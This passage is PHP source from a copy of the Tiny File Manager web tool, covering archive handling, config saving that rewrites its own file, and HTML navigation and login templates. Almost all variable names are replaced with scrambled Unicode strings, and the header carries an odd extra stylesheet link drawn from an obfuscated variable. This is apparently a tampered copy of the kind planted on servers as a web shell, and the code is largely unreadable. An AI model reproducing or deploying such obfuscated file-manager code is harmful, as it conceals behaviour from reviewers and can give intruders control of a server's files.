                if (!$this->addFileOrDir($ογ‚γγµγογογΌγ»)) {
                    $this->zip->close();
                    return false;
                }
            }
            $this->zip->close();
            return true;
        } else {
            if ($this->addFileOrDir($ο‚γΌγγγ»‚γ‰Όγ‚)) {
                $this->zip->close();
                return true;
            }
            return false;
        }
    }

    /**
     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
     * @param string $filename
     * @param string $path
     * @return bool
     */
    public function unzip($γµΌ„γγγογ²“‚‰»ΌΌ, $γΌγ‚²γγοΌΌγ„²«„)
    {
        $Όγγο»γΌ‰•ΌΌ™‚ = $this->zip->open($γµΌ„γγγογ²“‚‰»ΌΌ);
        if ($Όγγο»γΌ‰•ΌΌ™‚ !== true) {
            return false;
        }
        if ($this->zip->extractTo($γΌγ‚²γγοΌΌγ„²«„)) {
            $this->zip->close();
            return true;
        }
        return false;
    }

    /**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */
    private function addFileOrDir($γµΌ„γγγογ²“‚‰»ΌΌ)
    {
        if (is_file($γµΌ„γγγογ²“‚‰»ΌΌ)) {
            return $this->zip->addFile($γµΌ„γγγογ²“‚‰»ΌΌ);
        } elseif (is_dir($γµΌ„γγγογ²“‚‰»ΌΌ)) {
            return $this->addDir($γµΌ„γγγογ²“‚‰»ΌΌ);
        }
        return false;
    }

    /**
     * Add folder recursively
     * @param string $path
     * @return bool
     */
    private function addDir($γΌγ‚²γγοΌΌγ„²«„)
    {
        if (!$this->zip->addEmptyDir($γΌγ‚²γγοΌΌγ„²«„)) {
            return false;
        }
        $γγ‚“‰γ‚„‚™γγΏγ = scandir($γΌγ‚²γγοΌΌγ„²«„);
        if (is_array($γγ‚“‰γ‚„‚™γγΏγ)) {
            foreach ($γγ‚“‰γ‚„‚™γγΏγ as $γ»γγµ™„‚‚γ) {
                if ($γ»γγµ™„‚‚γ != '.' && $γ»γγµ™„‚‚γ != '..') {
                    if (is_dir($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ)) {
                        if (!$this->addDir($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ)) {
                            return false;
                        }
                    } elseif (is_file($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ)) {
                        if (!$this->zip->addFile($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ)) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}

/**
 * Class to work with Tar files (using PharData)
 */
class FM_Zipper_Tar
{
    private $γγΌ•‰²™γ²γ†ΌΈ;

    public function __construct()
    {
        $this->tar = null;
    }

    /**
     * Create archive with name $filename and files $files (RELATIVE PATHS!)
     * @param string $filename
     * @param array|string $files
     * @return bool
     */
    public function create($γµΌ„γγγογ²“‚‰»ΌΌ, $ο‚γΌγγγ»‚γ‰Όγ‚)
    {
        $this->tar = new PharData($γµΌ„γγγογ²“‚‰»ΌΌ);
        if (is_array($ο‚γΌγγγ»‚γ‰Όγ‚)) {
            foreach ($ο‚γΌγγγ»‚γ‰Όγ‚ as $ογ‚γγµγογογΌγ») {
                $ογ‚γγµγογογΌγ» = fm_clean_path($ογ‚γγµγογογΌγ»);
                if (!$this->addFileOrDir($ογ‚γγµγογογΌγ»)) {
                    return false;
                }
            }
            return true;
        } else {
            if ($this->addFileOrDir($ο‚γΌγγγ»‚γ‰Όγ‚)) {
                return true;
            }
            return false;
        }
    }

    /**
     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
     * @param string $filename
     * @param string $path
     * @return bool
     */
    public function unzip($γµΌ„γγγογ²“‚‰»ΌΌ, $γΌγ‚²γγοΌΌγ„²«„)
    {
        $Όγγο»γΌ‰•ΌΌ™‚ = $this->tar->open($γµΌ„γγγογ²“‚‰»ΌΌ);
        if ($Όγγο»γΌ‰•ΌΌ™‚ !== true) {
            return false;
        }
        if ($this->tar->extractTo($γΌγ‚²γγοΌΌγ„²«„)) {
            return true;
        }
        return false;
    }

    /**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */
    private function addFileOrDir($γµΌ„γγγογ²“‚‰»ΌΌ)
    {
        if (is_file($γµΌ„γγγογ²“‚‰»ΌΌ)) {
            try {
                $this->tar->addFile($γµΌ„γγγογ²“‚‰»ΌΌ);
                return true;
            } catch (Exception $γγγΌΌ†ογ‚γγ) {
                return false;
            }
        } elseif (is_dir($γµΌ„γγγογ²“‚‰»ΌΌ)) {
            return $this->addDir($γµΌ„γγγογ²“‚‰»ΌΌ);
        }
        return false;
    }

    /**
     * Add folder recursively
     * @param string $path
     * @return bool
     */
    private function addDir($γΌγ‚²γγοΌΌγ„²«„)
    {
        $γγ‚“‰γ‚„‚™γγΏγ = scandir($γΌγ‚²γγοΌΌγ„²«„);
        if (is_array($γγ‚“‰γ‚„‚™γγΏγ)) {
            foreach ($γγ‚“‰γ‚„‚™γγΏγ as $γ»γγµ™„‚‚γ) {
                if ($γ»γγµ™„‚‚γ != '.' && $γ»γγµ™„‚‚γ != '..') {
                    if (is_dir($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ)) {
                        if (!$this->addDir($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ)) {
                            return false;
                        }
                    } elseif (is_file($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ)) {
                        try {
                            $this->tar->addFile($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ);
                        } catch (Exception $γγγΌΌ†ογ‚γγ) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}

/**
 * Save Configuration
 */
class FM_Config
{
    var $οογγ―γ‹γ†Ό‚γ»;

    function __construct()
    {
        global $†¬γγγο¬†γΈΌ‰, $¬„γΌο²γγο„»‚Ώ», $„ο„„ογγγο‹;
        $γ‚Ώ‰γ‰γ„‚„γ¦γΌ = $¬„γΌο²γγο„»‚Ώ» . $_SERVER["PHP_SELF"];
        $this->data = array(
            'lang' => 'en',
            'error_reporting' => true,
            'show_hidden' => true
        );
        $οογγ―γ‹γ†Ό‚γ» = false;
        if (strlen($„ο„„ογγγο‹)) {
            $οογγ―γ‹γ†Ό‚γ» = fm_object_to_array(json_decode($„ο„„ογγγο‹));
        } else {
            $‚γ†γ²•„γ„γΌγ‚γ•‚ = 'Tiny File Manager<br>Error: Cannot load configuration';
            if (substr($γ‚Ώ‰γ‰γ„‚„γ¦γΌ, -1) == '/') {
                $γ‚Ώ‰γ‰γ„‚„γ¦γΌ = rtrim($γ‚Ώ‰γ‰γ„‚„γ¦γΌ, '/');
                $‚γ†γ²•„γ„γΌγ‚γ•‚ .= '<br>';
                $‚γ†γ²•„γ„γΌγ‚γ•‚ .= '<br>Seems like you have a trailing slash on the URL.';
                $‚γ†γ²•„γ„γΌγ‚γ•‚ .= '<br>Try this link: <a href="' . $γ‚Ώ‰γ‰γ„‚„γ¦γΌ . '">' . $γ‚Ώ‰γ‰γ„‚„γ¦γΌ . '</a>';
            }
            die($‚γ†γ²•„γ„γΌγ‚γ•‚);
        }
        if (is_array($οογγ―γ‹γ†Ό‚γ») && count($οογγ―γ‹γ†Ό‚γ»)) $this->data = $οογγ―γ‹γ†Ό‚γ»;
        else $this->save();
    }

    function save()
    {
        global $²‰‚Ό—²γγ¬γγογογγ;
        $®ΌΎ‚•γ»²γΎοµγγ»γ = is_readable($²‰‚Ό—²γγ¬γγογογγ) ? $²‰‚Ό—²γγ¬γγογογγ : __FILE__;
        $Ό®„Ώ„γΌµο‹‚»‰‚γ = '$CONFIG';
        $†¬γΌο¦γγ•‚²γ‰Ώ“ = var_export(json_encode($this->data), true);
        $γγ‰γΌο‰Ό»†ΎγΌ―Όγ = "<?php" . chr(13) . chr(10) . "//Default Configuration" . chr(13) . chr(10) . "$Ό®„Ώ„γΌµο‹‚»‰‚γ = $†¬γΌο¦γγ•‚²γ‰Ώ“;" . chr(13) . chr(10);
        if (is_writable($®ΌΎ‚•γ»²γΎοµγγ»γ)) {
            $²γ―γ„»ΎγΏγγγ‰οΌ = file($®ΌΎ‚•γ»²γΎοµγγ»γ);
            if ($‰‚γ²γ—γγ„‚γ = @fopen($®ΌΎ‚•γ»²γΎοµγγ»γ, "w")) {
                @fputs($‰‚γ²γ—γγ„‚γ, $γγ‰γΌο‰Ό»†ΎγΌ―Όγ, strlen($γγ‰γΌο‰Ό»†ΎγΌ―Όγ));
                for ($Ό‚™γΈγ»γ―Όγ = 3; $Ό‚™γΈγ»γ―Όγ < count($²γ―γ„»ΎγΏγγγ‰οΌ); $Ό‚™γΈγ»γ―Όγ++) {
                    @fputs($‰‚γ²γ—γγ„‚γ, $²γ―γ„»ΎγΏγγγ‰οΌ[$Ό‚™γΈγ»γ―Όγ], strlen($²γ―γ„»ΎγΏγγγ‰οΌ[$Ό‚™γΈγ»γ―Όγ]));
                }
                @fclose($‰‚γ²γ—γγ„‚γ);
            }
        }
    }
}

//--- Templates Functions ---

/**
 * Show nav block
 * @param string $path
 */
function fm_show_nav_path($γΌγ‚²γγοΌΌγ„²«„)
{
    global $»γογογγ™γ²γ, $ογγγγ„»γοΎγγµ‹, $γ»Όγ‰‚Όγγγγγ;
    $γΌγµ•ΌγΌγΈ¦ = $ογγγγ„»γοΎγγµ‹ ? 'fixed-top' : '';
?>
    <nav class="navbar navbar-expand-lg mb-4 main-nav <?php 
echo $γΌγµ•ΌγΌγΈ¦ ?> bg-body-tertiary" data-bs-theme="<?php 
echo FM_THEME; ?>">
        <a class="navbar-brand"> <?php 
echo lng('AppTitle') ?> </a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

            <?php

            $γΌγ‚²γγοΌΌγ„²«„ = fm_clean_path($γΌγ‚²γγοΌΌγ„²«„);
            $¬„γΌο²γγο„»‚Ώ» = "<a href='?p='><i class='fa fa-home' aria-hidden='true' title='" . FM_ROOT_PATH . "'></i></a>";
            $†γ‚γγγΌ―γγγ“‚ = '<i class="bread-crumb"> / </i>';
            if ($γΌγ‚²γγοΌΌγ„²«„ != '') {
                $γ‰“γγγγ™‚¦„ = explode('/', $γΌγ‚²γγοΌΌγ„²«„);
                $γΌ‰γγγΌΏ‰γγγ―ο = count($γ‰“γγγγ™‚¦„);
                $ΌΎγγγ¦ΌΌγοο‰γ„ = array();
                $γ†‚γΌ«γγγγγ = '';
                for ($ογΌγµγ†γγο†γοΌ = 0; $ογΌγµγ†γγο†γοΌ < $γΌ‰γγγΌΏ‰γγγ―ο; $ογΌγµγ†γγο†γοΌ++) {
                    $γ†‚γΌ«γγγγγ = trim($γ†‚γΌ«γγγγγ . '/' . $γ‰“γγγγ™‚¦„[$ογΌγµγ†γγο†γοΌ], '/');
                    $¦γογγ„Ό‚•ογΌ‰ = urlencode($γ†‚γΌ«γγγγγ);
                    $ΌΎγγγ¦ΌΌγοο‰γ„[] = "<a href='?p={$¦γογγ„Ό‚•ογΌ‰}'>" . fm_enc(fm_convert_win($γ‰“γγγγ™‚¦„[$ογΌγµγ†γγο†γοΌ])) . "</a>";
                }
                $¬„γΌο²γγο„»‚Ώ» .= $†γ‚γγγΌ―γγγ“‚ . implode($†γ‚γγγΌ―γγγ“‚, $ΌΎγγγ¦ΌΌγοο‰γ„);
            }
            echo '<div class="col-xs-6 col-sm-5">' . $¬„γΌο²γγο„»‚Ώ» . $γ»Όγ‰‚Όγγγγγ . '</div>';
            ?>

            <div class="col-xs-6 col-sm-7">
                <ul class="navbar-nav justify-content-end" data-bs-theme="<?php 
echo FM_THEME; ?>">
                    <li class="nav-item mr-2">
                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                            <input type="text" class="form-control" placeholder="<?php 
echo lng('Search') ?>" aria-label="<?php 
echo lng('Search') ?>" aria-describedby="search-addon2" id="search-addon">
                            <div class="input-group-append">
                                <span class="input-group-text brl-0 brr-0" id="search-addon2"><i class="fa fa-search"></i></span>
                            </div>
                            <div class="input-group-append btn-group">
                                <span class="input-group-text dropdown-toggle brl-0" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
                                <div class="dropdown-menu dropdown-menu-right">
                                    <a class="dropdown-item" href="<?php 
echo $γογ‰γγγ†γγγ‰γ„Ό = $γΌγ‚²γγοΌΌγ„²«„ ? $γΌγ‚²γγοΌΌγ„²«„ : '.'; ?>" id="js-search-modal" data-bs-toggle="modal" data-bs-target="#searchModal"><?php 
echo lng('Advanced Search') ?></a>
                                </div>
                            </div>
                        </div>
                    </li>
                    <?php 
if (!FM_READONLY): ?>
                        <li class="nav-item">
                            <a title="<?php 
echo lng('Upload') ?>" class="nav-link" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <?php 
echo lng('Upload') ?></a>
                        </li>
                        <li class="nav-item">
                            <a title="<?php 
echo lng('NewItem') ?>" class="nav-link" href="#createNewItem" data-bs-toggle="modal" data-bs-target="#createNewItem"><i class="fa fa-plus-square"></i> <?php 
echo lng('NewItem') ?></a>
                        </li>
                    <?php 
endif; ?>
                    <?php 
if (FM_USE_AUTH): ?>
                        <li class="nav-item avatar dropdown">
                            <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-5" data-bs-toggle="dropdown" aria-expanded="false">
                                <i class="fa fa-user-circle"></i>
                            </a>
                            <div class="dropdown-menu text-small shadow" aria-labelledby="navbarDropdownMenuLink-5" data-bs-theme="<?php 
echo FM_THEME; ?>">
                                <?php 
if (!FM_READONLY): ?>
                                    <a title="<?php 
echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php 
echo lng('Settings') ?></a>
                                <?php 
endif ?>
                                <a title="<?php 
echo lng('Help') ?>" class="dropdown-item nav-link" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;help=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> <?php 
echo lng('Help') ?></a>
                                <a title="<?php 
echo lng('Logout') ?>" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php 
echo lng('Logout') ?></a>
                            </div>
                        </li>
                    <?php 
else: ?>
                        <?php 
if (!FM_READONLY): ?>
                            <li class="nav-item">
                                <a title="<?php 
echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php 
echo lng('Settings') ?></a>
                            </li>
                        <?php 
endif; ?>
                    <?php 
endif; ?>
                </ul>
            </div>
        </div>
    </nav>
<?php

}

/**
 * Show alert message from session
 */
function fm_show_message()
{
    if (isset($_SESSION[FM_SESSION_ID]['message'])) {
        $γ•Ό„γγ‰γγ‚‚γ¦γγ = isset($_SESSION[FM_SESSION_ID]['status']) ? $_SESSION[FM_SESSION_ID]['status'] : 'ok';
        echo '<p class="message ' . $γ•Ό„γγ‰γγ‚‚γ¦γγ . '">' . $_SESSION[FM_SESSION_ID]['message'] . '</p>';
        unset($_SESSION[FM_SESSION_ID]['message']);
        unset($_SESSION[FM_SESSION_ID]['status']);
    }
}

/**
 * Show page header in Login Form
 */
function fm_show_header_login()
{
    header("Content-Type: text/html; charset=utf-8");
    header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
    header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
    header("Pragma: no-cache");

    global $‚ο‰γΌΌ†γ―γΌΌΌγγ;
?>
    <!DOCTYPE html>
    <html lang="en" data-bs-theme="<?php 
echo (FM_THEME == "dark") ? 'dark' : 'dark' ?>">

    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
        <meta name="author" content="CCP Programmers">
        <meta name="robots" content="noindex, nofollow">
        <meta name="googlebot" content="noindex">
        <?php 
if ($‚ο‰γΌΌ†γ―γΌΌΌγγ) {
            echo '<link rel="icon" href="' . fm_enc($‚ο‰γΌΌ†γ―γΌΌΌγγ) . '" type="image/png">';
        } ?>
        <title><?php 
echo fm_enc(APP_TITLE) ?></title>
        <?php 
print_external('pre-jsdelivr'); ?>
        <?php 
print_external('css-bootstrap'); ?>
        <style>
            body.fm-login-page {
                background-color: #f7f9fb;
                font-size: 14px;
                background-color: #f7f9fb;
                background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 304 304' width='304' height='304'%3E%3Cpath fill='%23e2e9f1' fill-opacity='0.4' d='M44.1 224a5 5 0 1 1 0 2H0v-2h44.1zm160 48a5 5 0 1 1 0 2H82v-2h122.1zm57.8-46a5 5 0 1 1 0-2H304v2h-42.1zm0 16a5 5 0 1 1 0-2H304v2h-42.1zm6.2-114a5 5 0 1 1 0 2h-86.2a5 5 0 1 1 0-2h86.2zm-256-48a5 5 0 1 1 0 2H0v-2h12.1zm185.8 34a5 5 0 1 1 0-2h86.2a5 5 0 1 1 0 2h-86.2zM258 12.1a5 5 0 1 1-2 0V0h2v12.1zm-64 208a5 5 0 1 1-2 0v-54.2a5 5 0 1 1 2 0v54.2zm48-198.2V80h62v2h-64V21.9a5 5 0 1 1 2 0zm16 16V64h46v2h-48V37.9a5 5 0 1 1 2 0zm-128 96V208h16v12.1a5 5 0 1 1-2 0V210h-16v-76.1a5 5 0 1 1 2 0zm-5.9-21.9a5 5 0 1 1 0 2H114v48H85.9a5 5 0 1 1 0-2H112v-48h12.1zm-6.2 130a5 5 0 1 1 0-2H176v-74.1a5 5 0 1 1 2 0V242h-60.1zm-16-64a5 5 0 1 1 0-2H114v48h10.1a5 5 0 1 1 0 2H112v-48h-10.1zM66 284.1a5 5 0 1 1-2 0V274H50v30h-2v-32h18v12.1zM236.1 176a5 5 0 1 1 0 2H226v94h48v32h-2v-30h-48v-98h12.1zm25.8-30a5 5 0 1 1 0-2H274v44.1a5 5 0 1 1-2 0V146h-10.1zm-64 96a5 5 0 1 1 0-2H208v-80h16v-14h-42.1a5 5 0 1 1 0-2H226v18h-16v80h-12.1zm86.2-210a5 5 0 1 1 0 2H272V0h2v32h10.1zM98 101.9V146H53.9a5 5 0 1 1 0-2H96v-42.1a5 5 0 1 1 2 0zM53.9 34a5 5 0 1 1 0-2H80V0h2v34H53.9zm60.1 3.9V66H82v64H69.9a5 5 0 1 1 0-2H80V64h32V37.9a5 5 0 1 1 2 0zM101.9 82a5 5 0 1 1 0-2H128V37.9a5 5 0 1 1 2 0V82h-28.1zm16-64a5 5 0 1 1 0-2H146v44.1a5 5 0 1 1-2 0V18h-26.1zm102.2 270a5 5 0 1 1 0 2H98v14h-2v-16h124.1zM242 149.9V160h16v34h-16v62h48v48h-2v-46h-48v-66h16v-30h-16v-12.1a5 5 0 1 1 2 0zM53.9 18a5 5 0 1 1 0-2H64V2H48V0h18v18H53.9zm112 32a5 5 0 1 1 0-2H192V0h50v2h-48v48h-28.1zm-48-48a5 5 0 0 1-9.8-2h2.07a3 3 0 1 0 5.66 0H178v34h-18V21.9a5 5 0 1 1 2 0V32h14V2h-58.1zm0 96a5 5 0 1 1 0-2H137l32-32h39V21.9a5 5 0 1 1 2 0V66h-40.17l-32 32H117.9zm28.1 90.1a5 5 0 1 1-2 0v-76.51L175.59 80H224V21.9a5 5 0 1 1 2 0V82h-49.59L146 112.41v75.69zm16 32a5 5 0 1 1-2 0v-99.51L184.59 96H300.1a5 5 0 0 1 3.9-3.9v2.07a3 3 0 0 0 0 5.66v2.07a5 5 0 0 1-3.9-3.9H185.41L162 121.41v98.69zm-144-64a5 5 0 1 1-2 0v-3.51l48-48V48h32V0h2v50H66v55.41l-48 48v2.69zM50 53.9v43.51l-48 48V208h26.1a5 5 0 1 1 0 2H0v-65.41l48-48V53.9a5 5 0 1 1 2 0zm-16 16V89.41l-34 34v-2.82l32-32V69.9a5 5 0 1 1 2 0zM12.1 32a5 5 0 1 1 0 2H9.41L0 43.41V40.6L8.59 32h3.51zm265.8 18a5 5 0 1 1 0-2h18.69l7.41-7.41v2.82L297.41 50H277.9zm-16 160a5 5 0 1 1 0-2H288v-71.41l16-16v2.82l-14 14V210h-28.1zm-208 32a5 5 0 1 1 0-2H64v-22.59L40.59 194H21.9a5 5 0 1 1 0-2H41.41L66 216.59V242H53.9zm150.2 14a5 5 0 1 1 0 2H96v-56.6L56.6 162H37.9a5 5 0 1 1 0-2h19.5L98 200.6V256h106.1zm-150.2 2a5 5 0 1 1 0-2H80v-46.59L48.59 178H21.9a5 5 0 1 1 0-2H49.41L82 208.59V258H53.9zM34 39.8v1.61L9.41 66H0v-2h8.59L32 40.59V0h2v39.8zM2 300.1a5 5 0 0 1 3.9 3.9H3.83A3 3 0 0 0 0 302.17V256h18v48h-2v-46H2v42.1zM34 241v63h-2v-62H0v-2h34v1zM17 18H0v-2h16V0h2v18h-1zm273-2h14v2h-16V0h2v16zm-32 273v15h-2v-14h-14v14h-2v-16h18v1zM0 92.1A5.02 5.02 0 0 1 6 97a5 5 0 0 1-6 4.9v-2.07a3 3 0 1 0 0-5.66V92.1zM80 272h2v32h-2v-32zm37.9 32h-2.07a3 3 0 0 0-5.66 0h-2.07a5 5 0 0 1 9.8 0zM5.9 0A5.02 5.02 0 0 1 0 5.9V3.83A3 3 0 0 0 3.83 0H5.9zm294.2 0h2.07A3 3 0 0 0 304 3.83V5.9a5 5 0 0 1-3.9-5.9zm3.9 300.1v2.07a3 3 0 0 0-1.83 1.83h-2.07a5 5 0 0 1 3.9-3.9zM97 100a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-48 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 96a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-144a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM49 36a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM33 68a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 240a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm80-176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm112 176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 180a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 84a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'%3E%3C/path%3E%3C/svg%3E");
            }

            .fm-login-page .brand {
                width: 121px;
                overflow: hidden;
                margin: 0 auto;
                position: relative;
                z-index: 1
            }

            .fm-login-page .brand img {
                width: 100%
            }

            .fm-login-page .card-wrapper {
                width: 360px;
            }

            .fm-login-page .card {
                border-color: transparent;
                box-shadow: 0 4px 8px rgba(0, 0, 0, .05)
            }

            .fm-login-page .card-title {
                margin-bottom: 1.5rem;
                font-size: 24px;
                font-weight: 400;
            }

            .fm-login-page .form-control {
                border-width: 2.3px
            }

            .fm-login-page .form-group label {
                width: 100%
            }

            .fm-login-page .btn.btn-block {
                padding: 12px 10px
            }

            .fm-login-page .footer {
                margin: 20px 0;
                color: #888;
                text-align: center
            }

            @media screen and (max-width:425px) {
                .fm-login-page .card-wrapper {
                    width: 90%;
                    margin: 0 auto;
                    margin-top: 10%;
                }
            }

            @media screen and (max-width:320px) {
                .fm-login-page .card.fat {
                    padding: 0
                }

                .fm-login-page .card.fat .card-body {
                    padding: 15px
                }
            }

            .message {
                padding: 4px 7px;
                border: 1px solid #ddd;
                background-color: #fff
            }

            .message.ok {
                border-color: green;
                color: green
            }

            .message.error {
                border-color: red;
                color: red
            }

            .message.alert {
                border-color: orange;
                color: orange
            }

            body.fm-login-page.theme-dark {
                background-color: #2f2a2a;
            }

            .theme-dark svg g,
            .theme-dark svg path {
                fill: #ffffff;
            }

            .theme-dark .form-control {
                color: #fff;
                background-color: #403e3e;
            }

            .h-100vh {
                min-height: 100vh;
            }
        </style>
    </head>

    <body class="fm-login-page <?php 
echo (FM_THEME == "dark") ? 'theme-dark' : ''; ?>">
        <div id="wrapper" class="container-fluid">

        <?php

    }

    /**
     * Show page footer in Login Form
     */
    function fm_show_footer_login()
    {
        ?>
        </div>
        <?php 
print_external('js-jquery'); ?>
        <?php 
print_external('js-bootstrap'); ?>
    </body>

    </html>

<?php

    }

    /**
     * Show Header after login
     */
    function fm_show_header()
    {
        header("Content-Type: text/html; charset=utf-8");
        header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
        header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
        header("Pragma: no-cache");

        global $ογγγγ„»γοΎγγµ‹, $‚ο‰γΌΌ†γ―γΌΌΌγγ;
        $γΌγµ•ΌγΌγΈ¦ = $ογγγγ„»γοΎγγµ‹ ? 'navbar-fixed' : 'navbar-normal';
?>
    <!DOCTYPE html>
    <html data-bs-theme="<?php 
echo FM_THEME; ?>">

    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
        	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>


<meta name="viewport" content="width=1024" />
    <meta name="robots" content="noindex, nofollow">
    <link rel="stylesheet" href="<?= $γγγγγγ™„»„ο² ?>">
        <?php 
if ($‚ο‰γΌΌ†γ―γΌΌΌγγ) {
            echo '<link rel="icon" href="' . fm_enc($‚ο‰γΌΌ†γ―γΌΌΌγγ) . '" type="image/png">';
        } ?>
        <title><?php 
echo fm_enc(APP_TITLE) ?> | <?php 
